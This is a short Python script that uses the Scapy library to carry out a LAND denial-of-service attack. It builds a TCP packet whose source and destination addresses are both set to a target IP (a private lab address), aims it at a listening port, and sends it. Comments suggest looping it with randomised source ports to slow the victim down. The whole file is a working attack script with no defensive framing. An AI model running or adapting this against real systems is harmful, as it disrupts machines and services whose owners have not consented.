#!/usr/bin/env python
from scapy.all import *   #importing all modules from scapy

conf.L3socket #raw packets
conf.L3socket=L3RawSocket #enabling raw packets
target="10.0.2.5" #enter the ip of the computer where you want to send the land attack packets
i=IP() # creating an IP layed
i.dst=target # sam ip for destination and source to creat an loop of syn packets 
i.src=target # the part below can be put in a loop and we can randomise out t.sport to slowdown the target
t=TCP() # creeating a tcp packet
t.sport=1234 #source port
t.dport=1465 # destination port on the victime must be listening
send(i/t) #sending the packets 
